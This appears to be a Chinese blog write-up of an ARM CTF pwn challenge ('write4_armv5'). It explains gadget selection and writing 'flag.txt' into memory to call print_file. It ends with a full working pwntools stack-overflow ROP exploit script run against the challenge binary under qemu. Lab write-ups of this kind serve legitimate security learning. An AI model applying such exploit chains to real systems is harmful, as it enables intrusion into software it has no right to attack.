---
title: write_armv5
date: 2023-03-23 20:12:15
categories: 
- pwn_wp
tags: 
- pwn
- arm
- stackoverflow



---

arm pwn入门题。
<!-- more -->

查壳：32bit 动态 只有NX

```sh
[*] '/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/write4_armv5/write4_armv5'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
    RUNPATH:  b'.'
```

逆向：

这次主函数有点怪，调用的pwnme是库函数的，看不到他的具体内容，不知道栈溢出偏移。

有个对`print_file`的调用和gadget:`pop {r0, pc}`还有个UsefulGadget:`STR r3, [r4] pop {r3, r4, pc}`

> A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like "flag.txt") as the 1st argument.

有一个叫print_file()的函数，只需要执行`print_file("flag.txt")`就可以cat flag。

为此我们需要将`flag.txt`写到内存中，然后控制程序执行`print_file("flag.txt")`

通过`UsefulGadget`可以将`flag.txt`写入到内存中。`pop {r3, r4, pc} -> STR r3, [r4] `，可以把`r3`中的内容存入`r4`指向的位置。但bss段只有2byte，写到前面data段开头，加上bss段才够`"flag.txt"`

**需要注意的是，由于寄存器只有4byte，因此要分两次才能写完`"flag.txt"`。**

exp:

```py
from pwn import*
context(log_level='debug',os='linux',arch='arm')
filename='write4_armv5'
elf=ELF('./'+filename)
#libc=ELF('')
# p=process('./'+filename)
p=process(["qemu-arm","-L","/usr/arm-linux-gnueabi/","-g","8888","./"+filename])
#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})
#p=remote('',)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()
    
str_r3_r4=0x000105EC
pop_r3_r4_pc=0x000105F0
pop_r0_pc=0x000105F4
print_file_addr=elf.plt['print_file']
data_addr=0x00021024

r()
payload=b'a'*0x24+p32(pop_r3_r4_pc)+b"flag"+p32(data_addr)+p32(str_r3_r4)
payload+=b".txt"+p32(data_addr+4)+p32(str_r3_r4)
payload+=p32(pop_r0_pc)*3+p32(data_addr)+p32(print_file_addr)
s(payload)

itr()

```

